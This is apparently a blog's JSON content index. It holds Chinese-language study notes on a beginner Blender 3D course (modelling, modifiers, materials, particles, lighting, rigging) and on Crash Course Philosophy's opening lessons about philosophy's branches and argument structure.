{"meta":{"title":"YEYEYETO","subtitle":"","description":"","author":"Eternal","url":"https://yeyeyeyeto.github.io","root":"/"},"pages":[{"title":"Categories","date":"2024-06-15T15:34:24.000Z","updated":"2024-06-15T07:55:22.554Z","comments":true,"path":"categories/index.html","permalink":"https://yeyeyeyeto.github.io/categories/index.html","excerpt":"","text":""},{"title":"Search","date":"2024-06-15T15:34:58.000Z","updated":"2024-06-15T07:46:26.116Z","comments":true,"path":"search/index.html","permalink":"https://yeyeyeyeto.github.io/search/index.html","excerpt":"","text":""},{"title":"Tags","date":"2024-06-15T15:33:37.000Z","updated":"2024-06-15T07:55:35.134Z","comments":true,"path":"tags/index.html","permalink":"https://yeyeyeyeto.github.io/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2024-06-15T16:27:24.000Z","updated":"2024-06-15T08:32:46.135Z","comments":true,"path":"about/index.html","permalink":"https://yeyeyeyeto.github.io/about/index.html","excerpt":"","text":"TEST BiliBili: 晚晚是个大魔王"}],"posts":[{"title":"Blender零基础入门教程 - 课程笔记","slug":"blender/Blender零基础入门教程 - 课程笔记","date":"2024-06-15T21:01:43.000Z","updated":"2024-06-15T13:21:39.585Z","comments":true,"path":"Blender/2024-06-16-blender/Blender零基础入门教程 - 课程笔记.html","permalink":"https://yeyeyeyeto.github.io/Blender/2024-06-16-blender/Blender%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%20-%20%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.html","excerpt":"","text":"01 基础操作1.1 基础设置编辑 - 偏好设置 - 可修改文字大小、编辑 - 偏好设置 - 视图切换 - 围绕选择物体旋转编辑 - 偏好设置 - 视图切换 - 缩放至鼠标位置编辑 - 偏好设置 - 键位映射 - 3D视图 - 拖动时的饼菜单 1.2 控制1.2.1 视角控制鼠标中建 旋转：按住 平移：Shift + 按住 缩放：滚轮 按钮（视图右上角） 旋转：坐标系 缩放：放大镜 平移：小手 摄像机视角（N侧边窗口） 按钮（视图左上角） 选择（可长按选择其他选择） 游标 移动 旋转 缩放 变化 1.2.2 物体控制移动物体: G旋转物体: R缩放物体: S恢复变换: Alt+G，Alt+R，Alt+S 新建物体: Shift+A复制物体: Shift+D（每个复制的物体都是独立的）关联性复制：Alt+D（每个物体的改动都会影响其他的物体）删除物体: X或者Delete 隐藏物体: H显示隐藏物体: Alt+H隐藏没有被选中的物体: Shift+H 选择物体刷选: C全选: A按住Shift可以加选或者减选 在对物体操作时，按X Y Z都可对该轴单独进行操作。G状态移动下按住Ctrl，可吸附网格移动缩放时，按住Shift+XYZ，可以保护对应轴不变。 1.2.3 视图切换小键盘区 7 顶视图，ctrl+7底视图 1 前视图，ctrl+1后视图 3 右视图，ctrl+3左视图 9 反转当前视图 0 切换摄像机的视角 5 切换透视投影和正交投影 2, 4, 6, 8 前后左右角度微调（默认15°） +,- 缩放微调 . 聚焦物体 键盘 ~ + 鼠标：视图操作 &#x2F;：聚焦物体 1.3 理解界面1.3.1 界面构成和整理 基本3D创作Workflow：建模 - 布光 - 材质 - 渲染 界面整理：用鼠标滑滑就知道了，省略！ 面板都是可以替换的、可以拆分的。上方其他选区其实本质都是面板的组合。后方的+号可以增加新的工作区。 Ctrl+空格：最大化和恢复当前面板。 1.3.2 游标和原点游标 游标在哪，新建物体就在哪。 游标可用于定位和当轴心点 移动游标：点击游标工具（左侧）或者Shift+右键 Shift+S：游标派目录 Shift+C：游标回归原点 原点 每个物体都有原点，在3D世界的计算机眼里，原点就是储存物体信息的数据点。 通过 选项（视图右上角） - “仅影响原点”移动 ALT+G将物体移动到视图中心。 1.3.3 坐标系和轴心点坐标系 分为全局坐标和局部坐标（物体自身坐标） 快速切换全局局部坐标：G + Z，X，Y（按Z，X，Y切换局部与全局） 轴心点 解释：绕着什么中心点旋转 切换轴心点：在视图上方第二个小按钮 质心点：物体模式下的重心点 边界框中心：物体画框内的中心 各自原点：字面意思 活动元素：多选时最后选的那一个 02 建模2.1 点线面的选择与控制2.1.1 编辑模式的切换 编辑 - 偏好设置 - 键位映射 - 3D视图 - 拖动时的饼菜单 点击模型 - TAB键 - 切换编辑模式按住TAB键可选更多模式（需要上边注释的设置后才能使用） 按C进入刷选状态后，会出现无法退出的情况你可以按住键盘Esc退出刷选状态；或者用鼠标右键在空白处点一下也可以退出。 2.1.2 点线面的切换、选择、控制切换 默认为点模式 在视图左上角模式旁边可选择点线面的切换；快捷键为1 2 3 shift按住选择点线面可同时编辑点线面 选择（编辑模式下左侧工具栏） 调整、框选、刷选、套索选择 W 选择工具切换 框选快捷键B、刷选快捷键 C 使用鼠标中键可以清除刚刚选中的点 Ctrl+I 反选 Shift 多选 Ctrl 将两个点的最短路径连接起来 L 相连元素相连；相当于选中所有的面 循环选择 Alt+鼠标双击：选择和它相连的一圈点（默认横向）；将往纵向方向移动后双击则是纵向的一圈点。 Ctrl+Alt+鼠标双击：可以选择与其垂直的线。 随机选择：视图上方 - 选择 - 随机选择 扩展&#x2F;缩减选择：视图上方 - 选择 - 扩展&#x2F;缩减选择。快捷使用为Ctrl+(+&#x2F;-)（小键盘+-号） Alt + Z 透视视图，可以方便选择背面的点线面；按钮在视图右上角的视图左侧。 控制 移动 G、缩放 S、旋转 R 删除快捷键X 直接删除会留下空洞。 融并：删除后，会将剩下的点线面连接起来不会出现空洞。 2.1.3 法向和法线的概念法向 分辨物体的正面和反面 查看法向：右上角视图左侧 - 向下小箭头 - 几何数据 - 面朝向 物体默认正反面，蓝色正面红色反面。 法线 法线为垂直该面的线，代表正面朝向 查看发线：进入编辑模式 - 同上的向下小箭头 - 法向 2.2 十大建模操作2.2.1 基础操作：移动&#x2F;旋转&#x2F;缩放 编辑模式左侧工具栏，快捷键GRS 标注：左侧工具栏画笔，按Ctrl清除。 监测工具 新建工具 2.2.2 四大：挤出&#x2F;向内挤出&#x2F;倒角&#x2F;循环切割挤出 E 快速挤出：Ctrl + 右键。连续不断挤出新的线。 点挤出就是线，线挤出就是面，面挤出就是体。 挤出流形：不会有重复边的问题。 沿法线挤出：字面意思 挤出各个面：与相邻的面是分开的。 挤出到光标：点到哪里挤出到哪里。 向内挤出 I I之后用鼠标操作即可，不会有多余的点。 倒角 Ctrl+B R切换到边模式 - Ctrl B拉出倒角 - 滚轮增加细分面（弹出窗口中 - 段数 也可以设置细分面） 环切 Ctrl+R 滑动滚轮增加减少切割面 右键自动吸附在最中心的位置 2.2.3 六小：合并&#x2F;断开&#x2F;填充&#x2F;切刀&#x2F;桥接&#x2F;分离合并 M 字面意思 断开 V 字面意思 切刀 K 鼠标右键&#x2F;空格键 退出 填充 F 出现空洞时，ALt + 双击鼠标选择边 - F 将洞口封住。 另一种方式：视图上方 - 面（Ctrl+F） - 栅格填充（前提是边必须是偶数的边） 桥接 Ctrl+E 需要将两个物体先合成为一个物体：Shift多选 - 快捷键Ctrl+J。（合并的部分最好先将各个物体连接面删除） 按住Shift+Alt选择物体需要桥接的边 - Ctrl+E 桥接循环边 分离 P Alt+Z进透视模式 - P分离菜单 - 分离选中项 2.3 常用修改器2.3.1 常规方法做螺母：LoopTools插件 柱体 - 六边形 - 高度降低 编辑模式 - 选择上下两个面 - 向内挤出 编辑模式 - 点控制 - Alt+Z透视模式选中中间的所有点 - 右键细分 N召唤右侧菜单 - 编辑 - LoopTools - 圆环（不够圆可以继续第三步骤的细分再圆环） X - 删除这两个面 选中上下的边 - Ctrl+E - 桥接循环边 边模式 - 选择Alt双击旁边的边 + Shift以及下边 + 切换为点模式自动连接面（4.0不可需要手动选择垂直线） Ctrl+B - 拉动滚轮加倒角细分（4.0不可用） 剩下步骤4.0不可用 2.3.2 最常用的三个修改器：表面细分&#x2F;实体化&#x2F;倒角修改器添加修改器 - 右边窗口中的小扳手 表面细分修改器 将网格的面分割成更小的面，使其看起来更平滑。 实体化修改器 获取任意网格的表面，然后为之添加深度，使之变厚。 倒角 宽度是坡口形成的两条新边的距离，段数是增加细分。 布尔 可以对两个物体进行交集，差集，并集运算，偶尔会出现奇怪的问题，慎用。 使用修改器建模的优势 建模快，效率高，能快速直观地实现一个效果。 非破坏性，在不改变原来模型的基础上，可以很精确地控制参数。 灵活，可重复使用，可叠加多个效果。（修改器的顺序就是执行的顺序） 应用修改器数据：向下小箭头 - 应用，快捷键Ctrl+A。（不应用前可以一直修改） 2.3.3 修改器方法做螺母 新建圆环 - 六条边 编辑模式 - 边模式 - Alt选中边 - F填充 添加修改器 - 实体化 - 加厚度 新建圆柱 - S瘦小 - Shift+Z保护Z轴 添加布尔修改器 - 小吸管吸刚刚的圆柱体 - 隐藏圆柱体 添加倒角修改器 - 修改数量和段数 Ctrl+A应用 2.4 建模马拉松2.4.1 蘑菇 - 简易形变&#x2F;吸附修改器 Ctrl+2：快捷键 细分为二的修改器 简易形变：弯曲点是跟着物体的原点。 Shift+D：可以复制修改器，修改器可以叠加使用。 尽量不要在物体模式下缩放，尽量在编辑模式下缩放。假如你在物体模式下做过缩放，记得应用这个缩放。Ctrl+A 应用 设置父子级 先选择儿子 - Shift 选择爸爸 - Ctrl+P - 物体 吸附 打开视图上方小磁铁 菜单里选择面投射 打勾 - 旋转对其目标&amp;背面剔除 2.4.2 树桩 - 衰减&#x2F;分离&#x2F;拉平拉平底座 切换到透视模式 - 选择下边所有的点 进入正视图 - S Z 0（缩放所有点在Z轴上归于0） 苔藓 编辑模式 - 透视模式 - 选择最上面的点 Shift+D复制并移动 - 撤销移动 P - 分离选中项 - 然后就是单独的模型了 2.4.3 花朵 - 旋转工具 编辑模式下 - A快捷键全选 旋转工具 围绕着游标进行旋转。 点击+号是自动旋转一周 鼠标点击白线才能操控旋转工具 2.4.4 树干 - 缩裹修改器缩裹修改器 可以吸附在物体上面进行修改，要求细分段数要足够高 用小吸管吸，需要吸附的物体 2.4.5 龟背竹 - 拓扑&#x2F;合并&#x2F;断开&#x2F;切刀K：画一条切开线 - 空格确定 - V切开 2.5 阵列修改器与晶格形变阵列的相对偏移和恒定偏移 相对偏移是比例的关系，以物体的长宽高为比例去做不同程度的偏移。 恒定偏移以原点为标地 右键 - 转换到网格 - 一次性应用了所有修改器 晶格形变工具 Shift+A新建晶格 将需要控制的物体包裹在内 可以增加晶格细分以便后续更多控制物体 选中本来的物体再选择晶格 - Ctrl+P - 晶格形变（这样就绑定在一起了） 进入编辑模式，移动晶格时，物体也会跟着改变。 应用晶格修改器：选中物体 - 右键 - 转换 - 网格 之后晶格没用了就可以单独删除掉了 2.6 曲线修改器&#x2F;蒙皮修改器2.6.1 曲线的基础知识Blender曲线分类 贝塞尔曲线 有两个控制轴 圆环 其实是封闭的贝塞尔曲线 NURBS曲线 全称为 Non-Uniform Rational B-Spline NURBS圆环 路径曲线 通过点去拟合出一条曲线的走向；而贝塞尔是通过控制杆。 每一个点都有一个W值，这个W值影响着曲线的曲率。 Fur 曲线控制 可以使用E延长 连接曲线 点击两个点 - 按F可以将点连接起来 Alt+C，选中任意一点后使用，自动闭合。 断开曲线 选中两个点 - X删除 - 段数 单独调整 选中点 - Alt+S - 拉动虚线，单独对部分位置调整粗细 曲线工具 - 右侧绿色曲线小工具 几何数据 - 倒角 圆（四舍五入） 深度，控制粗细，设置深度可以使其直接变成一个管子。 分辨率，可以使其更光滑。 物体 在本来曲线外新建一个曲线，调整新曲线到想要的弯曲度 在本来曲线中曲线工具找到 - 倒角 - 物体，小吸管 吸新曲线 轮廓 可以自由拉出自己想要的曲线 曲线的横截面就为该曲线 小视图左下角是四种衰减方式 2.6.2 曲线修改器 新建一个曲线后调整到想要的角度 给想要弯曲的物体添加曲线修改器 在曲线修改器内用小吸管吸曲线 对点进行Alt+S还可以控制部分曲线的半径 2.6.3 父子级关系详解绑定父子级关系 - Ctrl+P 物体：正常绑定 物体（保持变换）：保持方向等变换 物体（无反向）：会让父子 原点重合，把旋转缩放位置都清空 物体（保持变化无反向）：以上两个相加。 顶点：较为死板，只基于一个点吸附 顶点（基于三点）：比较灵活，会跟着角度旋转 清空父子级关系 - Alt+P 2.6.4 蒙皮修改器 给线加一层罩子 挤分叉：可以点其中容易可以点进行分叉 加粗变细：选择任意点 - Ctrl+A - 可以改变半径 平滑着色：修改器内自带。 2.7 置换修改器2.7.1 置换修改器的基本步骤 细分： 添加平面 - 编辑模式 - 右键添加细分（次数调得高一点） 也可以添加细分修改器调整 添加置换修改器 置换修改器中新建一个新纹理 - 最右边的小按钮 类型中可以选择贴图，有内置也可以自选。 调整参数 可以调整修改器的参数 也可以调整纹理自带的标签 2.7.2 置换修改器做石头 添加立方体 - 细分（推荐表面细分修改器） 添加置换修改器 - 添加贴图 - 沃罗诺伊图 设置参数 - 纹理表情：尺寸放大；间隔矩阵 - 改为方形矩形间隔。 设置参数 - 置换修改器：强度拉小 编辑模式 - 置换修改器第二个小按钮，可以更方便修改石头形状。 03 材质3.1 材质基础3.1.1 材质算法PBR：Physically Based Rendering，基于物理的渲染。BRDF：Bidirectional Reflectance Distribution Function，双向散射分布函数。BSDF：BSDF包含了BRDF（反射）和BTDF（透射）。 3.1.2 操作材质添加和删除材质 右侧倒数第二小标签 小盾牌：保护材质，即使没有使用也不会被清除。 添加多种材质：进入编辑模式 - 选中面，可以对不同的面添加不同的材质。 着色器编辑器 新拉一个窗口切换；与材质标签是相通的。 原理化BSDF GGX：微表面反射光照模型。（多重散射GGX会更加细致，但肉眼看不出来，一般不用。） 随机游走：模拟器表面的一种渲染方式，只针对CYCLES。 基础色：模型的颜色，也可以接-个颜色贴图，-般不要纯黑或者纯白 金属度：0是非金属，1是金属,一般我们要么选0，要么选1 糙度：0代表越平滑，1代表越粗糙，确定漫反射和镜面反射时候物体表面的粗糙程度 高光：代表物体的菲尼尔效应反射率程度，数值越大，高光反射量越大，高光越亮， 菲尼尔效应：你站在湖边，你能看清脚下的石头；看不清远方，远方的水面只能看见倒影。 不同物质的高光都各不相同。 因为所有物体都是有一些菲尼尔反射的，所以高光这个值不要设为零，多少给一点。默认是0.5 高光染色：将高光染上材质的颜色。 默认不设置的时候，物理默认的高光是白色的， 但是你把高光染色调到1，就会被物体本身的颜色和谐，一般金属高光会染色，非金属高光不会染色 清漆：这个类似于给你的材质加了一层包光。多一层白色高光，常用与制作车漆材质 清漆粗糙度：就是你加这层清漆的粗糙度 清漆法线：类似于汽车清漆的法线，可以接法线贴图 IOR折射率：不同材料的透射率。 数百种常见材质的折射率值 透射：透明度；让你的模型透明，只有打开这个，IOR折射率和透射粗糙度才起作用， 透射粗糙度：物体内部的粗糙度，会有类似毛玻璃的效果。 Alpha-默认是1，当是0的时候，物体完全消失不见 次表面：决定你的模型是不是透光的，比如皮肤，窗帘等的通透程度， 一般不会调太大，没有那么通透的东西 简单设置：先给基础色 - 再给一个次表面颜色 - 拉大次表面数值。 次表面半径：透光的程度和距离。 次表面颜色决定透过去的颜色是什么样的，但是你指定的这个颜色，是跟次表面半径相乘后显示的效果；所以如果你想完全显示次表面颜色，次表面半径就全部设定为1。 次表面IOR：次表面散射的折射率，仅支持cycles 次表面各向异性：次表面散射的方向，仅支持cycles 各项异性过滤：调大的时候可以把一点的高光转换成沿切线方向的细长高光，仅支持cycles 各项异性旋转：比较常使用的是金属的部分，他可以控制你的金属的高光分布的方向，仅支持cycles 光泽：用于布料的部分，调到1，有天鹅绒的效果，控制的是褶皱反光的反射数量，数值越大越明显 光泽染色：会把材质颜色和白色光色混合 自发光-可以发光，霓虹灯 法向-通常这个会链接PBR的normal map法线贴图 切向-这个就是各向异性这种金属高光的方向。可以作为切向贴图接口 3.2 纹理3.2.1 添加图像纹理（添加纹理需要5个节点） 打开着色编辑器；Shift+A 新建纹理 - 图像纹理；图像纹理的颜色 连接 - BSDF基础色 载入纹理 Shift+A 添加矢量 - 映射；映射 矢量 连接到 - 纹理 矢量； Shift+A 添加输入 - 纹理坐标； 3.2.2 纹理坐标详解 你想要以哪种方式呈现纹理。 UV：计算机会把3D的模型先转换成一个2D平面UV图，然后再跟你的2D纹理做一个对应映射。 可以拉出UV编辑器编辑；选择物体进入编辑模式才会显示。 生成：只有上下有图像；投射方式由图像纹理控制的。用全局坐标系去做映射。 物体：用物体坐标系做映射；可以指定坐标轴（可使用空物体坐标轴）。 摄像机：摄像机坐标系。 3.2.3 映射节点详解 改变纹理位置、旋转和缩放。 点：该模式下移动，其实是移动的坐标轴。 纹理：该模式下移动的就是纹理本身。 矢量：只有旋转和缩放。 Shift按住滑动上下选中XYZ，后左右即可一起改变数值。 3.2.4 添加渐变纹理 在着色编辑器中 - Shift+A 添加转换器 - 颜色渐变 - 连上BSDF基础色 Shift+A 添加矢量 - 映射；连接颜色渐变 Shift+A 添加输入 - 纹理坐标；连接映射 Shift+A 添加转换器 - 分离XYZ；拖到映射和纹理坐标中间（会自动连接）； 矢量是既有大小又有方向的量。纹理中，紫色代表矢量、灰色为常理、黄色为颜色相关、绿色代表颜色输出接口。 3.2.5 程序化纹理 Shift+A 纹理；各种内置纹理 3.3 蒙版添加材质给蘑菇上材质 - 常规方法Node Wrangler插件：先选中你要加的节点，按Ctrl+T就可以自动添加映射和纹理坐标。 混合节点详解 Shift+A 转换器 - 混合； 颜色：连接BSDF基础色； 系数为调整两个颜色的比例 颜色可以连接贴图 钳制系数：将值限制在0~1 可以用黑白颜色纹理图代替系数 使用颜色渐变节点来改变颜色 Shift+A 转换器 - 颜色渐变 单一图像时用颜色渐变更方便；多个纹理叠加使用混合。 给蘑菇嘉发光点 调整材质 自发光 选择点点的文件包 - 右键 - 选择物体；Shift选最后上材质的物体 - Ctrl+L关联材质 3.4 凹凸感与置换形变3.4.1 凹凸感 需要基础纹理：需要三个纹理贴图。 需要一个凹凸节点 纹理坐标映射 计算机能模拟出凹凸感，其实是靠着给每个面的法向不同的值，然后模拟出凹凸感与对光线的反应。 法向贴图为什么是蓝紫色的：法向是个矢量，矢量可以用XYZ坐标轴表示；计算机里有RGB颜色；用RGB代表XYZ，将值输入给法向。 3.4.2 置换形变（在凹凸感设置的基础上）方法1：置换修改器 编辑模式 - 给物体加细分 - 细分段数越多形变越逼真 添加置换修改器 给物体本身添加纹理置换贴图Displacement（右侧小工具）；注意置换修改器中的强度设置；细节不够可以加表面修改器。方法2：添加置换节点（比较消耗电脑资源，不用） 右侧小工具 - 材质 - 设置 - 表（曲）面 - 置换 - 改为置换与凹凸 添加新的纹理贴图 - 添加Displacement贴图 - 右侧通过 矢量 置换 - 直接连接输出 添加细分修改器快速方法 材质界面 - 选中BSDF - Ctrl+Shift+T - 选择四张图：颜色图、displacement、roughness、法向图。 右侧通过 矢量 置换 - 直接连接输出(Cycles引擎中才有) 3.5 混合材质与Node Wrangler如何做混合材质 Shift+A - 着色器 - 混合着色器 Ctrl+J，分组，将节点包裹到一个黑框内。 Node Wrangler常用快捷键 Ctrl+T：快速自动加上纹理坐标和映射。 Ctrl+Shift+T：快速连接PBR材质。 Ctrl+Shift+单击节点：快速预览 Ctrl+Shift+右键拖拉：可以快速增加一个混合BSDF节点。 Alt+S，快速切换混合节点的上下顺序 3.6 简单UV纹理绘制如何查看一个模型的UV展开图 UV纹理绘制的三个步骤 添加一个带图像纹理的材质 新建一个图像纹理贴图做底 进入纹理绘制模式绘制 绘制小狐狸 转换为网格（应用修改器） 编辑模式 - U - 智能UV投射；按住Alt双击中间一条线 - U - 标记缝合边 - U - 展开 新建材质 - Ctrl+T - 新建颜色；UV不会自动加载材质需要自己设置。 （待补充笔记） 04 粒子4.1 发射体粒子4.1.1 发射体粒子的基础设置添加粒子：右侧粒子标签栏 - 点击+号添加。 自发光 Number：粒子个数 随机种：随机分布；例如渲染为集合时会比较明显。 起始与结束帧：播放帧数定义 生命周期：每个粒子存活帧数 生命周期随机性：随机分布粒子的随机性，最大为上边设定的生命周期。数字越大随机范围越广。 源 发射源 面 - 在表面发射 顶点 - 在顶点发射 体积 - 在内部发射 速度 法向：法向就是每个面的方向或者切线方向 物理对齐：可以给XYZ不同的力度，让粒子往想要的地方吹。 旋转 随机化阶段：让粒子运动过程不显得死板，随机增加旋转。 物理 力场 布朗运动：随机运动。 渲染 渲染为： 改为物体 - 可以在下边物体栏用小吸管提取别的物体作为粒子。 改为集合 - 粒子变为集合内所包含的物体 缩放：缩放粒子 缩放随机性：随机缩放各个粒子的大小，越往1靠缩放范围越大；注意不要超过自己定义的缩放值。 显示发射体：射发粒子的模型；比如云朵。 力场权重 重力：顾名思义。 4.1.2 粒子的碰撞 选择需要被碰撞的物体 - 侧边的物理标签 - 添加碰撞 碰撞 粒子 阻尼：阻尼越小弹力越大 随机：随机分布粒子的阻尼 摩擦：摩擦力小时，粒子会在倾斜的地方滑落 4.1.3 力场对粒子的作用 场景中默认是有重力的 - 右侧小山标签 新建力场 - 常力 - 物理标签属性 类型中可以快速改为其他力 力度：加大就是吹风机，减少到低于零就是吸力。 4.2 毛发粒子4.2.1 毛发标签属性 自发光 段数：如果需要弯曲需要增加段数。 旋转（需要勾选高级选项；毛发必勾选高级） 坐标系轴向：粒子生长方向 默认法向方向 全局Z 相位：控制所有粒子的旋转 随机化阶段：随机化控制每个粒子旋转角度。 物理（需要勾选高级选项） 让粒子有随机化的形变。 渲染 缩放随机化 子级 简单型 显示数量：在显示器预览时看见的数量；每个单独粒子代表的数量。 渲染数量：渲染时的数量；方便在操作时节省电脑资源。 长度 簇集 簇：1为上边形成集成一团；-1下面形成一团。 扭曲：顾名思义。 4.2.2 毛发粒子基础 - 草地 添加粒子属性 添加材质；草地颜色默认是跟着图片的颜色走的。 4.2.3 毛发粒子做森林 给物体添加粒子系统 - 选择毛发 渲染 - 改为物体；勾选 物体 - 旋转 找到原物体；原物体的旋转角度影响着粒子物体（需要勾选粒子标签中渲染的物体旋转）；记得先检查物体的局部坐标。（右上角弓箭小图标 - 移动，可以打开轴） 4.2.4 如何给物体随机分配颜色 添加材质 物体信息（随机） - 颜色渐变 - 输出 4.2.5小火苗 顶点组权重设置 进入编辑模式 - 进入透视模式 选中部分 - 点击右侧倒三角物体属性标签 - 顶点组 添加 指定 切换权重模式 - 左上角权重菜单 - 光滑 - 随着迭代增多越来越平滑 物体模式 - 置换修改器 - 添加顶点组 新建空物体 纯轴 - 置换修改器坐标改为物体 - 吸纯轴 选择纯轴 - N - 在变化Z轴中输入#frame&#x2F;10 05 场景灯光5.1 小白布光宝典5.1.1 设置世界环境光 右侧 小地球标签 世界属性 颜色：默认深灰色；点击小点可以添加其他工具 天空纹理（部分内容只在Cycles下能用） 强度&#x2F;力度：世界光强度 着色编辑器 物体 切换为 世界环境 5.1.2 常用四种设置世界光 修改默认背景节点 天空纹理 渐变纹理 环境纹理 - HDRI贴图 5.1.3 HDRI贴图打世界光 方法 着色编辑器 世界环境中 添加 环境纹理 连接到输出 新建或打开； 以下为blender内置HDRI1D:\\Software\\Blender\\4.1\\datafiles\\studiolights\\world 只想要光照效果：在渲染引擎 - 胶片 - 勾选透明 旋转贴图：Ctrl+T - 调整Z轴 5.1.4 如何设置场景灯光点光 右侧小标签灯光属性；可以即时切换不同的灯光 能量：瓦数。 半径：半径越大影子越虚 最多反弹次数：光线模拟光在不同面上的被反弹的次数；比较耗性能。（Cycles） 日光 日光位置不影响照明效果，但角度非常重要。是个平行光。 聚光 单方向的光，聚光灯。 光束形状 光圈尺寸：喇叭口开口大小 混合：聚光发散程度 面光 柔光板； 可以R旋转；拉小黄点可以直接指向目标 形状：可以改变不同形状。 尺寸：越大，光线越发散越柔和 5.1.5 常规打光步骤 世界光：定基调，打造基础光环境 场景光：让布光有主次，有逻辑，有美感 5.1.6 三点布光法（面光） 主光 把主要对象照亮 副光 不能喧宾夺主；不能抢主光的风头 轮廓光 一般从主体背面打，逆光，主要用于勾勒物体轮廓； 不想让轮廓光影响到阴影：灯光设置 - 取消勾选 投射阴影 5.2 三方素材导入第三方素材关联与追加 关联：关联源文件，只能从源文件修改。 追加：可以直接修改，但会导致场景文件过大。（直接复制粘贴也可以）FBX与OBJ 两种模型文件 OBJ一般带有mtl材质文件 06 动画6.1 动画工具时间轴动画基础 blender下方拉开 就是时间轴；数字表示为帧数 打关键帧 右键 - 插入关键帧；快捷键I 不同位置打上不同关键帧，即可做动画 关键帧窗口最左侧 点开 是所有关键帧的汇总 其他属性打关键帧：在属性位置上按I；属性右侧的小点也可以加关键帧 动画工具（关键帧左上角时间图标） 曲线编辑器 任意一条线都有控制轴，通过调整控制轴调整动画的速率； 按Ctrl拉动会有吸附效果，让你的线更平缓。 N召唤小窗口 - 右侧可添加修改器 帧率最好设定为偶数 形态键动画摄像机动画骨骼绑定物体约束跟随动画修改器粒子动画 6.2 形态键动画 从一种形态变为另外一种形态 给物体添加形态键：右侧绿色标签栏 - 添加形态键 基型：变身前的形态 键1：分身 6.3 骨骼绑定新建 骨架：包含骨架和姿态，骨架是骨头，姿态为动作骨骼属性 - 右侧标签栏小人 骨骼的三种模式 物体模式 物体模式下只能新建骨骼，编辑模式下才能在原本骨骼上建立新的骨骼。 编辑模式 在尾端可以E新拉出来一条骨骼、还可以细分。从尾部拉出和细分，都为原本的子级。 从头部挤出的骨骼为同级。 姿态模式 只有在姿态模式才能给单个骨骼打关键帧；物体模式只能给整个骨架打关键帧。 骨骼绑定模型 绑定要在物体模式下；绑定是用模型作为骨架的子级（看不到骨架就到骨架属性里边 - 视图显示 - 勾选 在前面） 先选择模型 - 再选择骨架 - Ctrl+P 骨架形变 附带自动权重 权重的概念 物体模式 - 切换到权重绘制 通过渐变的权重能让弯曲的时候不会太硬 初始化：姿态模式 - 姿态 - 清空变换 - 全部 狐狸尾巴 Alt+P 清空父级 放置好原点与物体的位置 新建骨骼 - 使和物体重合；进入编辑模式 - 缩小 Ctrl+Shift+Alt+S 放大 侧视图 - 点击骨骼小圆球 - 拉长到整个物体 选择中间骨骼 - Ctrl+Shift+Alt+S 变细 中间骨骼 - 骨骼属性（骨头标签） - 柔性骨骼 - 增加段数 进入姿态模式 给两端的骨骼改名，以及中间的骨骼 需要将top骨骼独立出来；编辑模式下 - Alt+P清空父级 选择top骨骼进入姿态模式 - Shift先选择控制器再选择body骨骼 - Ctrl+Shift+C 加约束- 拉伸到 选择body骨骼 - 小骨头标签 - 柔性骨骼 - 起始结束控制柄选择绝对 - 自定义选择两端的骨骼 物体模式进行绑定 - （top控制骨骼 - 小绿骨头标签 - 取消勾选形变） Shift先选模型 再选骨骼 - Ctrl+P - 骨架形变 - 附带自动权重 绑定回原fox（记得应用缩放） 制作动画省略.. 重复动画循环，需要把第一帧复制到最后一帧；曲线编辑器中选择骨骼下所有点 添加循环修改器 狐狸头问题 先选择鼻子眼睛嘴巴 - Alt+P清空并保持变换结果 之后选择头 + Ctrl+P 绑定父级 物体约束 - 标准跟随 右侧修改带样式标签（约束） - 标准跟随 吸管提取物体 跟随轴是按照局部坐标来的 向上是全局坐标 选中你想要查看的物体按小键盘的小数点可以快速定位,方便查找 07 合成7.1 合成器使用合成器窗口 - 勾选使用节点 合成器的使用步骤 先渲染出一张图 V缩小；Alt+V放大 Shift右键划一刀合成；连接上预览器 M暂时预览 Cycles引擎采样中降噪一定要打开；采样率不是越高越好，打开降噪，它们显示效果是看不出来差别的。 VFX特效 如果你安装了Node Wrangler可以按住shift ctrl单击渲染层可以自动给你连接一个渲染器 7.2 渲染输出待补充","categories":[{"name":"Blender","slug":"Blender","permalink":"https://yeyeyeyeto.github.io/categories/Blender/"}],"tags":[]},{"title":"Crash Course Philosophy 课程笔记","slug":"mental/Crash Course Philosophy 课程笔记","date":"2024-06-15T20:22:59.000Z","updated":"2024-06-15T12:30:16.254Z","comments":true,"path":"哲学/2024-06-16-mental/Crash Course Philosophy 课程笔记.html","permalink":"https://yeyeyeyeto.github.io/%E5%93%B2%E5%AD%A6/2024-06-16-mental/Crash%20Course%20Philosophy%20%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.html","excerpt":"","text":"1. 什么是哲学如果我所有的决定真的只是我的成长经历和我大脑内流动的化学物质的结果，那我的决定真的是自由的吗？If all of my decisions really are just the result of how I was raised and what chemicals I have flowing through my brain, then are any of my choices actually free? 如果我并非真的自由，可以自己做决定，选择自己的行为，那我为什么要对这些决定和行为负责？If I’m not truly free to make my own decisions, or choose my own actions, then how can I be held accountable for them? 最早，哲学指对任何事物的学术研究。当时各个学科统称哲学，而最终包含强烈经验要素的研究变成如今的科学，寻求答案的研究。但哲学更多理解成一种思考问题的方式。 哲学三大分支： 形而上学 Metaphysics：理解世界，宇宙和存在的本质的思考。 认识论 Epistemology：研究如何认识知识，即对知识的研究。 价值论 Value theory：帮助和围绕你实际所做的事形成自己的思考。 伦理学：价值论的一部分。研究人类应该如何彼此相处。 美学：价值论的一部分。研究美与艺术。 Logic 逻辑逻辑关于推理，形成不会产生谬误的强有力的论证。谬论是哲学精确性永恒的敌人 两步法(two-step method)第一步：真正地试图去理解，深入思考。第二步：调整自己进行一些严肃的批判性评价。摧毁你对世界原有的看法，因为只有当你挑战自己对他人看待世界的方式时，才能判断他人的观点是否值得拥有。 辨证法是思辩与实证相统一方法，研究对立统一、普遍规律、思维与存在的关系问题以辨证的思维方式为主哲学学说，其三种基本形式为：古代的朴素辩证法、以黑格尔为代表的唯心辩证法、马克思主义的唯物辩证法。 2. 如何论证：哲学推理理性的价值 The Value of Reason大多数时候，人们都可以通过论证被说服。 绝大多数人并不擅长论证，我们往往把进行一个好的论证与抖机灵的反驳或仅仅是更大声更愤怒的主张自己的观点进行混淆，而不是在坚实的逻辑基础上进行论述。 论证的结构 The Structure of Arguments前提 形成论证的框架，它们提供信念的证据。 你可以提出尽可能多的 前提，只要它们能够支持你的 结论，结论 就是你实际相信的内容。 Species of arguments: Deductive、Inductive、Abductive、Argument by Analogy、Reductio 